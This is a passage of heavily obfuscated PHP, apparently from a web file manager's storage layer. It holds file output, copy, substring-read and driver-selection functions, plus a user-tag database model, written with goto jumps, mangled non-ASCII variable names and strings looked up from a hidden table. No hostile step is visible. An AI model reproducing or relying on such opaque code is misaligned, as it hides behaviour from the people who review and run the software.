$B£•´ô¶×Õ = '') { $eàŸÛ¼„Ûµ = self::driverMake($añÔğÀéˆ); if ($eàŸÛ¼„Ûµ->isFileOutServer()) { return $eàŸÛ¼„Ûµ->fileOutServer($añÔğÀéˆ, $EàÇòÚ­à, $BØİ³ø¼¦, $B£•´ô¶×Õ); } return $eàŸÛ¼„Ûµ->fileOut($añÔğÀéˆ, $EàÇòÚ­à, $BØİ³ø¼¦, $B£•´ô¶×Õ); } public static function fileOutImage($BàšŸš¤ê“, $Dñëà‡çÎ = 250) { $D©é» = array(250, 600, 1200, 3000, 5000); for ($E©ää½´ô = 0; $E©ää½´ô < count($D©é»); $E©ää½´ô++) { if ($E©ää½´ô == 0 && $Dñëà‡çÎ <= $D©é»[$E©ää½´ô]) { $Dñëà‡çÎ = $D©é»[$E©ää½´ô]; break; } else { if ($Dñëà‡çÎ > $D©é»[$E©ää½´ô - 1] && $Dñëà‡çÎ <= $D©é»[$E©ää½´ô]) { $Dñëà‡çÎ = $D©é»[$E©ää½´ô]; break; } else { if ($E©ää½´ô == count($D©é») - 1 && $Dñëà‡çÎ > $D©é»[$E©ää½´ô]) { $Dñëà‡çÎ = $D©é»[$E©ää½´ô]; break; } } } } $DºŠŸÒÔÍó = self::driverMake($BàšŸš¤ê“); if ($DºŠŸÒÔÍó->isFileOutServer()) { return $DºŠŸÒÔÍó->fileOutImageServer($BàšŸš¤ê“, $Dñëà‡çÎ); } return $DºŠŸÒÔÍó->fileOutImage($BàšŸš¤ê“, $Dñëà‡çÎ); } private static function driverIsSame($Eƒİ¦Âß­’, $eøŠƒ•—­Ç) { goto EÓ«Ø³¸é¸; EÓ«Ø³¸é¸: $f İ¬‘œÖä =& $_SERVER[ä°„ä°º]; $aŠ‹©Ø¯‘ = $Eƒİ¦Âß­’->getType(); $C—øƒ¬Ú•¥ = $eøŠƒ•—­Ç->getType(); goto c¢­†…ÑÆ’; c¢­†…ÑÆ’: if ($aŠ‹©Ø¯‘ != $C—øƒ¬Ú•¥) { return !1; } if ($aŠ‹©Ø¯‘ == $f İ¬‘œÖä[741]) { return !0; } if ($aŠ‹©Ø¯‘ == $f İ¬‘œÖä[106]) { return !0; } goto d…–âÏ”¼Š; d…–âÏ”¼Š: if ($Eƒİ¦Âß­’->pathDriver == $eøŠƒ•—­Ç->pathDriver) { return !0; } return !1; goto E“ ½Àô–«; E“ ½Àô–«: } public static function copyUpdate($cíøğğñ, $aÅ‚ç‰§¼) { goto bºÂçÚèÔİ; bºÂçÚèÔİ: $FÒŒ‘´ìãå =& $_SERVER[ä°„ä°º]; if (!IO::exist($cíøğğñ)) { return !1; } if (!IO::exist($aÅ‚ç‰§¼)) { IO::mkdir($aÅ‚ç‰§¼); } goto c‰Ó¼‚Ä†; c‰Ó¼‚Ä†: $cÁ¾ã‹‰í = self::_listAll($cíøğğñ); $fòìƒÄ™¢ = self::_listAll($aÅ‚ç‰§¼); $a½ìÄ©ÁÔ = array(); goto aóªøƒ÷ì¥; aóªøƒ÷ì¥: $eİê®ì„³’ = array(); foreach ($cÁ¾ã‹‰í as $eºÁ“°³•  => $B»øõ„Ôóó) { if (isset($fòìƒÄ™¢[$eºÁ“°³• ])) { if ($B»øõ„Ôóó[$FÒŒ‘´ìãå[77]] == 1) { continue; } if ($fòìƒÄ™¢[$eºÁ“°³• ][$FÒŒ‘´ìãå[78]] == $B»øõ„Ôóó[$FÒŒ‘´ìãå[78]]) { continue; } } if ($B»øõ„Ôóó[$FÒŒ‘´ìãå[77]] == 1) { $eİê®ì„³’[] = $aÅ‚ç‰§¼ . $FÒŒ‘´ìãå[8] . $eºÁ“°³• ; continue; } $D¦‡£«Üµ­ = strstr(trim($eºÁ“°³• , $FÒŒ‘´ìãå[8]), $FÒŒ‘´ìãå[8]) ? get_path_father($eºÁ“°³• ) : $FÒŒ‘´ìãå[33]; $a½ìÄ©ÁÔ[] = array($FÒŒ‘´ìãå[1076] => $B»øõ„Ôóó[$FÒŒ‘´ìãå[76]], $FÒŒ‘´ìãå[1077] => rtrim($aÅ‚ç‰§¼, $FÒŒ‘´ìãå[8]) . $FÒŒ‘´ìãå[8] . $D¦‡£«Üµ­, $FÒŒ‘´ìãå[1078] => $B»øõ„Ôóó); } $B×‚ë¼Ê½È = array($FÒŒ‘´ìãå[193] => $a½ìÄ©ÁÔ, $FÒŒ‘´ìãå[77] => $eİê®ì„³’); goto B²Èôµ©¹¹; B²Èôµ©¹¹: Hook::trigger($FÒŒ‘´ìãå[1079], $cíøğğñ, $aÅ‚ç‰§¼, $B×‚ë¼Ê½È); foreach ($eİê®ì„³’ as $B»øõ„Ôóó) { IO::mkdir($B»øõ„Ôóó); } foreach ($a½ìÄ©ÁÔ as $B»øõ„Ôóó) { IO::copy($B»øõ„Ôóó[$FÒŒ‘´ìãå[1076]], $B»øõ„Ôóó[$FÒŒ‘´ìãå[1077]], REPEAT_REPLACE); } goto BõÂ”‘Ò‡Š; BõÂ”‘Ò‡Š: } private static function _listAll($cÌù¶Òˆ¦) { $CñÛ¥ìÍñµ =& $_SERVER[ä°„ä°º]; $cÌù¶Òˆ¦ = KodIO::clear($cÌù¶Òˆ¦); $cÖØÄèİÇ = IO::listAll($cÌù¶Òˆ¦); foreach ($cÖØÄèİÇ as &$eóâÕëÑ¥) { $Dùø¿‰‘·Õ = substr($eóâÕëÑ¥[$CñÛ¥ìÍñµ[76]], strlen($cÌù¶Òˆ¦)); $eóâÕëÑ¥[$CñÛ¥ìÍñµ[1080]] = trim($Dùø¿‰‘·Õ, $CñÛ¥ìÍñµ[8]); } unset($eóâÕëÑ¥); return array_to_keyvalue($cÖØÄèİÇ, $CñÛ¥ìÍñµ[1080]); } public static function fileSubstr($Cšç¦Ùš, $bŸÁµáá, $dÑß´æŞÁŞ = false) { goto cëíŞó§İÕ; aùî˜–¤ ¼: if (!$a²İº…«Á“ && $dÑß´æŞÁŞ && isset($GLOBALS[$d´•ç†•‰à[1083]])) { throw new Exception($GLOBALS[$d´•ç†•‰à[1083]][$d´•ç†•‰à[1084]]); } return $a²İº…«Á“; goto b¿ƒ½¨ Ÿˆ; F£ö½ŞäÓ: if ($dÑß´æŞÁŞ <= 0) { return $d´•ç†•‰à[33]; } if ($bŸÁµáá < 0 || $bŸÁµáá >= $e‚Ã¬Âåâß || $dÑß´æŞÁŞ > 1024 * 1024 * 5) { throw new Exception("\x66\151\x6c\x65\122\x65\141\144\40\145\162\x72\157\162\x21\x20\163\x74\141\x72\164\x3d{$bŸÁµáá}\73\x6c\x65\x6e\147\x74\x68\x3d{$dÑß´æŞÁŞ}\73\x20\163\x69\172\145\75{$e‚Ã¬Âåâß}\x3b"); } $a²İº…«Á“ = $Bö©÷Ñˆ‡•->fileSubstr($Cšç¦Ùš, $bŸÁµáá, $dÑß´æŞÁŞ); goto aùî˜–¤ ¼; a†ÌŠĞŠÔ—: if ($dÑß´æŞÁŞ === !1) { $dÑß´æŞÁŞ = $e‚Ã¬Âåâß - $bŸÁµáá; } if ($bŸÁµáá + $dÑß´æŞÁŞ > $e‚Ã¬Âåâß) { $dÑß´æŞÁŞ = $e‚Ã¬Âåâß - $bŸÁµáá; } if (!$e‚Ã¬Âåâß && $Bö©÷Ñˆ‡•->getType() == $d´•ç†•‰à[106] && !$Bö©÷Ñˆ‡•->exist($Cšç¦Ùš)) { throw new Exception($d´•ç†•‰à[1081] . LNG($d´•ç†•‰à[1082]) . $d´•ç†•‰à[946] . get_path_this($Cšç¦Ùš) . $d´•ç†•‰à[33]); } goto F£ö½ŞäÓ; cëíŞó§İÕ: $d´•ç†•‰à =& $_SERVER[ä°„ä°º]; $Bö©÷Ñˆ‡• = self::driverMake($Cšç¦Ùš); $e‚Ã¬Âåâß = $Bö©÷Ñˆ‡•->size($Cšç¦Ùš); goto EÂ£šæ®¯Ğ; EÂ£šæ®¯Ğ: $dùŞÔò·®µ = $bŸÁµáá; $EŒ–æÄÆÄ† = $dÑß´æŞÁŞ; if ($bŸÁµáá < 0) { $bŸÁµáá = $e‚Ã¬Âåâß + $bŸÁµáá; } goto a†ÌŠĞŠÔ—; b¿ƒ½¨ Ÿˆ: } private static function driverMake(&$FòñĞ—Í¾) { goto DÜ¿ÁãÌ¬; E·§Ù©ç¤»: if ($EµÑÂƒ†Íß[$AÊÃ›ÉùàË[29]] == KodIO::KOD_IO && !self::$driverListSystem[$EµÑÂƒ†Íß[$AÊÃ›ÉùàË[393]]]) { return !1; } $FòñĞ—Í¾ = $EµÑÂƒ†Íß[$AÊÃ›ÉùàË[1085]]; $Dİ®óó¬Ó« = self::driverGet($EµÑÂƒ†Íß, $FòñĞ—Í¾); goto f¸â–¤îÄ; DÜ¿ÁãÌ¬: $AÊÃ›ÉùàË =& $_SERVER[ä°„ä°º]; $EµÑÂƒ†Íß = KodIO::parse($FòñĞ—Í¾); if (!self::$driverListSystem) { $BŠ‹Š×‚ = Model($AÊÃ›ÉùàË[750])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($BŠ‹Š×‚, $AÊÃ›ÉùàË[393]); } goto E·§Ù©ç¤»; f¸â–¤îÄ: return $Dİ®óó¬Ó«; goto Dİ©’ÅËõ; Dİ©’ÅËõ: } private static function driverGet($a‚¦¹Ë…ˆ, &$e‹Ÿ»Ğ…Û£) { goto fëÒ– Öí°; cÈ±³éÌæ: $a¿˜Ç¡¢ö->path = $e‹Ÿ»Ğ…Û£; return $a¿˜Ç¡¢ö; goto a ¼åêåÆİ; BÖ¿Ã™™Ó‡: $a¿˜Ç¡¢ö = self::$driverCache[$B£‘‘‹÷›‡]; $a¿˜Ç¡¢ö->pathDriver = $cä×šà·£š; $a¿˜Ç¡¢ö->pathBase = $Eñ¬†¢çÆ‰[33]; goto fîÖ›·óØ; fëÒ– Öí°: $Eñ¬†¢çÆ‰ =& $_SERVER[ä°„ä°º]; $cä×šà·£š = $a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[1086]]; $eÌ¡±¸…çŒ = $a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[393]]; goto a°¶íöÉºà; a°¶íöÉºà: switch ($a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[29]]) { case KodIO::KOD_IO: $aİâ×ÑÜ „ = self::$driverListSystem[$eÌ¡±¸…çŒ]; break; case KodIO::KOD_SOURCE: $e‹Ÿ»Ğ…Û£ = $eÌ¡±¸…çŒ . $e‹Ÿ»Ğ…Û£; $aİâ×ÑÜ „ = array($Eñ¬†¢çÆ‰[1087] => $Eñ¬†¢çÆ‰[1088], $Eñ¬†¢çÆ‰[6] => $a‚¦¹Ë…ˆ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $bóÎ¥ğØÎ = $GLOBALS[$Eñ¬†¢çÆ‰[1089]]; self::$driverListUser = array_to_keyvalue($bóÎ¥ğØÎ, $Eñ¬†¢çÆ‰[393]); } $aİâ×ÑÜ „ = self::$driverListUser[$eÌ¡±¸…çŒ]; break; case KodIO::KOD_SHARE_LINK: $aİâ×ÑÜ „ = array($Eñ¬†¢çÆ‰[1087] => $Eñ¬†¢çÆ‰[1090], $Eñ¬†¢çÆ‰[6] => $a‚¦¹Ë…ˆ); $e×³”°§Ì = Action($Eñ¬†¢çÆ‰[1091])->sharePathInfo($a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[76]]); $e‹Ÿ»Ğ…Û£ = $e×³”°§Ì[$Eñ¬†¢çÆ‰[395]]; if (!$e×³”°§Ì[$Eñ¬†¢çÆ‰[395]]) { $Bà¢Øê = Model($Eñ¬†¢çÆ‰[576])->getInfo($e×³”°§Ì[$Eñ¬†¢çÆ‰[468]]); $e‹Ÿ»Ğ…Û£ = KodIO::clear($Bà¢Øê[$Eñ¬†¢çÆ‰[1092]] . $a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[1085]]); $a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[466]] = $Bà¢Øê; $a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[1069]] = $e‹Ÿ»Ğ…Û£; $aİâ×ÑÜ „ = array($Eñ¬†¢çÆ‰[1087] => $Eñ¬†¢çÆ‰[1093], $Eñ¬†¢çÆ‰[6] => $a‚¦¹Ë…ˆ); } break; case KodIO::KOD_SHARE_ITEM: $aİâ×ÑÜ „ = array($Eñ¬†¢çÆ‰[1087] => $Eñ¬†¢çÆ‰[1094], $Eñ¬†¢çÆ‰[6] => $a‚¦¹Ë…ˆ); $Bà¢Øê = Model($Eñ¬†¢çÆ‰[576])->getInfo($a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[393]]); if ($Bà¢Øê[$Eñ¬†¢çÆ‰[395]] == $Eñ¬†¢çÆ‰[191]) { $e‹Ÿ»Ğ…Û£ = KodIO::clear($Bà¢Øê[$Eñ¬†¢çÆ‰[1092]] . $a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[1085]]); $a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[466]] = $Bà¢Øê; $a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[1069]] = $e‹Ÿ»Ğ…Û£; $aİâ×ÑÜ „ = array($Eñ¬†¢çÆ‰[1087] => $Eñ¬†¢çÆ‰[1095], $Eñ¬†¢çÆ‰[6] => $a‚¦¹Ë…ˆ); } else { if (!$e‹Ÿ»Ğ…Û£) { $e‹Ÿ»Ğ…Û£ = $Bà¢Øê[$Eñ¬†¢çÆ‰[395]]; } } break; default: $e‹Ÿ»Ğ…Û£ = $a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[76]]; $aİâ×ÑÜ „ = array($Eñ¬†¢çÆ‰[1087] => $Eñ¬†¢çÆ‰[1096]); break; } $B£‘‘‹÷›‡ = $a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[76]]; if (!isset(self::$driverCache[$B£‘‘‹÷›‡])) { $DÈ¼µÄ« = strtolower($aİâ×ÑÜ „[$Eñ¬†¢çÆ‰[94]]); $bìš·å–…ƒ = $GLOBALS[$Eñ¬†¢çÆ‰[6]][$Eñ¬†¢çÆ‰[88]][$Eñ¬†¢çÆ‰[814]]; $cÇŞ¹ê´Ã = $Eñ¬†¢çÆ‰[72] . (isset($bìš·å–…ƒ[$DÈ¼µÄ«]) ? $bìš·å–…ƒ[$DÈ¼µÄ«] : ucfirst($DÈ¼µÄ«)); if (!class_exists($cÇŞ¹ê´Ã)) { show_json("{$cÇŞ¹ê´Ã}\x20\x6e\157\x74\x20\x65\170\151\x73\164\163\x21", !1); } $A“†°©‰Âí = isset($aİâ×ÑÜ „[$Eñ¬†¢çÆ‰[6]]) ? $aİâ×ÑÜ „[$Eñ¬†¢çÆ‰[6]] : !1; self::$driverCache[$B£‘‘‹÷›‡] = new $cÇŞ¹ê´Ã($A“†°©‰Âí); } goto BÖ¿Ã™™Ó‡; fîÖ›·óØ: if (isset($aİâ×ÑÜ „[$Eñ¬†¢çÆ‰[6]][$Eñ¬†¢çÆ‰[1097]])) { $a¿˜Ç¡¢ö->pathBase = rtrim($aİâ×ÑÜ „[$Eñ¬†¢çÆ‰[6]][$Eñ¬†¢çÆ‰[1097]], $Eñ¬†¢çÆ‰[8]) . $Eñ¬†¢çÆ‰[8]; $e‹Ÿ»Ğ…Û£ = $a¿˜Ç¡¢ö->pathBase . ltrim($e‹Ÿ»Ğ…Û£, $Eñ¬†¢çÆ‰[8]); } $e‹Ÿ»Ğ…Û£ = $a¿˜Ç¡¢ö->getPath($e‹Ÿ»Ğ…Û£); if (isset($a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[1069]])) { $e‹Ÿ»Ğ…Û£ = $a‚¦¹Ë…ˆ[$Eñ¬†¢çÆ‰[1069]]; } goto cÈ±³éÌæ; a ¼åêåÆİ: } public static function errorTips($Dìß…ÎÜÆØ = false) { goto C¥Œî‰¯; C¥Œî‰¯: $CäâŸìŠ™À =& $_SERVER[ä°„ä°º]; static $b……í‰Ì“¹ = array(); $f¹ ÃÁ‰ï´ = 1000; goto EÄ÷¤É†; EÄ÷¤É†: if ($Dìß…ÎÜÆØ === -1) { return $b……í‰Ì“¹ ? $b……í‰Ì“¹[count($b……í‰Ì“¹) - 1] : $CäâŸìŠ™À[33]; } if ($Dìß…ÎÜÆØ === !1) { return implode($CäâŸìŠ™À[229], $b……í‰Ì“¹); } if (count($b……í‰Ì“¹) >= $f¹ ÃÁ‰ï´) { $b……í‰Ì“¹ = array_slice($b……í‰Ì“¹, $f¹ ÃÁ‰ï´ * 0.5, $f¹ ÃÁ‰ï´); } goto DâË‡òÕƒè; DâË‡òÕƒè: $b……í‰Ì“¹[] = $Dìß…ÎÜÆØ; write_log($CäâŸìŠ™À[160] . ACTION . $CäâŸìŠ™À[1098] . $Dìß…ÎÜÆØ, $CäâŸìŠ™À[1099]); goto EÑƒ’”ã; EÑƒ’”ã: } public static function getLastError($b´ÉîğÀº» = '') { $B†™¾Î¹ìÑ = self::errorTips(-1); return $B†™¾Î¹ìÑ ? $B†™¾Î¹ìÑ : $b´ÉîğÀº»; } } goto f§¤ĞÚ¹; D•ÁÏÅ–: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($B„é¬¢‘Ã) { $b‚ºˆÁ“ˆ® =& $_SERVER[ä°„ä°º]; return array($b‚ºˆÁ“ˆ®[1822] => array(USER_ID, $b‚ºˆÁ“ˆ®[1823])); } protected function listData() { $Eë«¾¦ˆ =& $_SERVER[ä°„ä°º]; $aÀôÑÓ…ˆƒ = array($Eë«¾¦ˆ[1542] => USER_ID, $Eë«¾¦ˆ[463] => array($Eë«¾¦ˆ[1826], 0)); $fÁà¯­ïß¦ = $Eë«¾¦ˆ[1828]; $fö²ÈŠç˜ = $this->field($fÁà¯­ïß¦)->where($aÀôÑÓ…ˆƒ)->order($Eë«¾¦ˆ[1829])->select(); return $fö²ÈŠç˜ ? $fö²ÈŠç˜ : array(); } protected function listByTag($f†×Óç•) { } protected function addToTag($f¤¡å¿¿Ì, $FèŠÂ§‘†) { $Dù¦’é÷÷Ì =& $_SERVER[ä°„ä°º]; if (!Model($Dù¦’é÷÷Ì[1963])->listData($FèŠÂ§‘†) || !Model($Dù¦’é÷÷Ì[813])->pathInfo($f¤¡å¿¿Ì)) { return !1; } $bø—‡Ç²íˆ = array($Dù¦’é÷÷Ì[1542] => USER_ID, $Dù¦’é÷÷Ì[463] => $FèŠÂ§‘†, $Dù¦’é÷÷Ì[414] => $f¤¡å¿¿Ì, $Dù¦’é÷÷Ì[415] => $Dù¦’é÷÷Ì[409], $Dù¦’é÷÷Ì[413] => $Dù¦’é÷÷Ì[33], $Dù¦’é÷÷Ì[1724] => 0); if ($this->where($bø—‡Ç²íˆ)->find()) { return !1; } return $this->add($bø—‡Ç²íˆ); } protected function removeFromTag($cí¢çªš¡ä, $F‹½¹ÑÎÙˆ) { $BøÛ²’ÎÁÔ =& $_SERVER[ä°„ä°º]; if (!Model($BøÛ²’ÎÁÔ[1963])->listData($F‹½¹ÑÎÙˆ)) { return !1; } if (is_array($cí¢çªš¡ä)) { $cí¢çªš¡ä = array($BøÛ²’ÎÁÔ[7], $cí¢çªš¡ä); } $BÛó¨Ì½¤ = array($BøÛ²’ÎÁÔ[1542] => USER_ID, $BøÛ²’ÎÁÔ[463] => $F‹½¹ÑÎÙˆ, $BøÛ²’ÎÁÔ[415] => $BøÛ²’ÎÁÔ[409], $BøÛ²’ÎÁÔ[414] => $cí¢çªš¡ä); return $this->where($BÛó¨Ì½¤)->delete(); } protected function removeByTag($cÊÃ‘½Û»Û) { $EˆäÂ†‡¹“ =& $_SERVER[ä°„ä°º]; if (!$cÊÃ‘½Û»Û) { return !1; } $A²¶äàĞ» = array($EˆäÂ†‡¹“[1542] => USER_ID, $EˆäÂ†‡¹“[463] => $cÊÃ‘½Û»Û); return $this->where($A²¶äàĞ»)->delete(); } protected function removeBySource($cÈÔãĞœá) { $dÂÑİÌ¿·é =& $_SERVER[ä°„ä°º]; if (is_array($cÈÔãĞœá)) { $cÈÔãĞœá = array($dÂÑİÌ¿·é[7], $cÈÔãĞœá); } $Cñ±Å¼õƒ· = array($dÂÑİÌ¿·é[1542] => USER_ID, $dÂÑİÌ¿·é[414] => $cÈÔãĞœá, $dÂÑİÌ¿·é[463] => array($dÂÑİÌ¿·é[993], 0)); return $this->where($Cñ±Å¼õƒ·)->delete(); } }